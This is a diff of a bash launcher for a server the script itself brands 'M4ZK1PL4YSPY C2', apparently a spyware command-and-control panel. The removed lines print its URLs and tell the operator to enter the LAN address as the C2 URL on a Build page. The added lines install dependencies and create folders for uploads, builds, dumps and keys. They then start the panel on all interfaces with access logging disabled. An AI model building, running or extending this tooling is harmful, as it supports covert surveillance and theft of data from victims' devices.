@@ -1,33 +1,8 @@
 #!/usr/bin/env bash
-# Jalankan C2. Linux · macOS · Termux.
-set -euo pipefail
-R='\033[1;31m'; A='\033[1;33m'; C='\033[1;36m'; N='\033[0m'
+set -e
 cd "$(dirname "$0")"
-
-[[ -d .venv ]] || { echo -e "${R}[M4ZK1PLAY]${N} Jalankan ./install.sh dulu."; exit 1; }
-# shellcheck disable=SC1091
+[ -d .venv ] || python3 -m venv .venv
 source .venv/bin/activate
-
-PORT="$(python - <<'PYEOF'
-import json
-try: print(json.load(open("config.json")).get("port", 8777))
-except Exception: print(8777)
-PYEOF
-)"
-
-LAN=""
-command -v ip >/dev/null 2>&1 && LAN="$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}' || true)"
-
-echo -e "${R}╔════════════════════════════════════════════════╗${N}"
-echo -e "${R}║${N}  M4ZK1PL4YSPY C2  · v1.5.0                    ${R}║${N}"
-echo -e "${R}╚════════════════════════════════════════════════╝${N}"
-echo
-echo -e "  Lokal   : ${C}http://127.0.0.1:${PORT}${N}"
-[[ -n "$LAN" ]] && echo -e "  LAN     : ${C}http://${LAN}:${PORT}${N}"
-echo -e "  Lisensi : ${A}M4ZK1PL4Y${N}"
-echo -e "  Stop    : ${A}CTRL+C${N}"
-echo
-echo -e "${A}Penting:${N} di halaman Build isi URL C2 dengan alamat LAN di atas."
-echo
-
-exec uvicorn server.main:app --host 0.0.0.0 --port "$PORT"
+pip install -q -r requirements.txt
+mkdir -p data/uploads data/builds data/dumps data/keys
+exec uvicorn server.main:app --host 0.0.0.0 --port "${PORT:-8777}" --no-access-log
